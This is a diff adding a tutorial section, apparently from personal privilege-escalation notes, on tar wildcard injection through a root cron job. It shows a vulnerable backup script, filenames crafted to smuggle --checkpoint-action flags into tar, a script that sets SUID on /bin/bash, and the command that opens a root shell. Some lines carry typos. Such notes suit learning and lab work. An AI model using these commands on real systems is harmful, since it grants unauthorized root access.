@@ -29,6 +29,49 @@ If the full path of the script is not defined (as it was done for the backup.sh 
 
 Finallly, we could creat ```antivirus.sh``` file and insert into the reverse shell code and setup a listener to recieve or connection.
 
+Another one
+----
 
+If the crontab run a file with root access and this file contain `tar` command with ```*``` , this an indicator of privilege escalation.
 
+****Vulnerable bash script****
+```
+#!/bin/bash
+cd /home/ubuntu/Desktop/TarWildCardPrivEsc/
+tar -zcf /home/ubuntu/Desktop/TarWildCardPrivEsc/backup.tgz *
+```
+* The wildcard `*` matches all files and directories in the current directory. This means all files in /home/ubuntu/Desktop/TarWildCardPrivEsc/ will be included in the backup.tgz archive.
+
+>As an attacker, we can leverage this and create specially crafted filenames that will be interpreted as **flags** for tar, instead of actual files.
+
+The critical two flags we will use:
+```
+--checkpoint=1    >>>>>>> means "execute a checkpoint every 1 file processed.
+--checkpoint-action=    >>>>>> do an action every checkpoint
+```
+The above two commands use the exec parameter of checkpoint-action to execute commands through the tar command. This is how we’ll abuse this:
+
+```
+echo '#/!bin/bash\nchmod +s /bin/bash' > shell.sh
+                     
+                          #or
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/shell.sh    
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+```
+In the backend, the whole thing is interpreted as:
+```
+tar -zcf /home/ubuntu/Desktop/TarWildCardPrivEsc/backup.tgz --checkpoint=1 --checkpoint=action=exec=sh shell.sh
+```
+The ```shell.sh``` contains a bash shell with a command that sets SUID bit to ```/bin/bash```. The second command executes the ```shell.sh```. So when the cronjob will execute the next minute, it will take those files as arguments/flags rather than a normal file name and set ```/bin/bash``` with setuid permission.
+
+![Screenshot from 2024-09-29 04-31-59](https://github.com/user-attachments/assets/94a82170-755b-4416-9bd8-48d7f938827a)
+
+We can see that /bin/bash now has a SUID bit set means we can execute it with root privileges and get the root shell.
+
+Now run the below command to get the root shell.
+
+```
+/bin/bash -p
+```
 
